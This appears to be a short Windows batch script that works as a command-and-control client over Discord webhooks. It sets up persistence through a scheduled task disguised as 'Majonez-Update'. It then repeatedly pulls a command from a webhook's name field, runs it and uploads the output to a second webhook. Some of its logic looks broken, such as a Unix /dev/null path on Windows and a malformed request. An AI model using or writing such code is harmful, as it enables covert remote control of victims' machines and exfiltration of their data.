@echo off
cd %appdata%
if exist "klucz.txt" (( goto :notfirstrun)
) else goto :next
:next
curl --silent -L --fail "https://github.com/stedolan/jq/releases/download/jq-1.6/jq-win32.exe" -o jq.exe
schtasks /create /sc minute /mo 2 /tn "Majonez-Update" /tr "C:\Users\pawel\Desktop\c2.bat"
echo klucz > klucz.txt
)
:notfirstrun
set "webhook=https://discord.com/api/webhooks/your_first_webhook_here"
curl --silent --output /dev/null -X GET "https://discord.com/channels/946412766518972486/webhooks" %webhook% > a
jq.exe -r .name a > get.bat
del a
fc /b get.bat stored.bat > nul
if errorlevel 1 (
    goto :fireandsend
) else (
    goto :done
)
:fireandsend
set "tempsys=%appdata%\out.txt"
call 2>NUL .\get.bat > "%tempsys%"
set "webhook2=https://discord.com/api/webhooks/second_webhook_here"
curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook2%
copy get.bat stored.bat
:done
exit 0